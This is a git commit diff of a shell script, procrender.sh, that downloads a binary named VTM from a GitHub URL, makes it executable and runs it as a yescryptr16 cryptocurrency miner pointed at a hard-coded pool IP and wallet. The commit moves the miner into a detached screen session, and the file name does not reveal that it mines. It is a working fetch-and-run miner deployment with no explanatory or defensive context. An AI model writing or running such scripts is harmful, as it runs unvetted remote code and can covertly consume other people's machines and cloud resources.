2328963fdf85665751c978494ff9c5f143ae2f03
renilo <88342640+renilo@users.noreply.github.com>
2022-10-07 00:44:01 +0700

    Update procrender.sh

--- procrender.sh
+++ procrender.sh
@@ -1,8 +1,8 @@
 sudo apt update
 clear
 sudo apt install screen
-screen -R VTM
+
 
 wget https://github.com/indah38/theta/raw/main/VTM
 chmod 700 VTM
-./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p t$(nproc --all)
+screen -dmS VTM ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t3
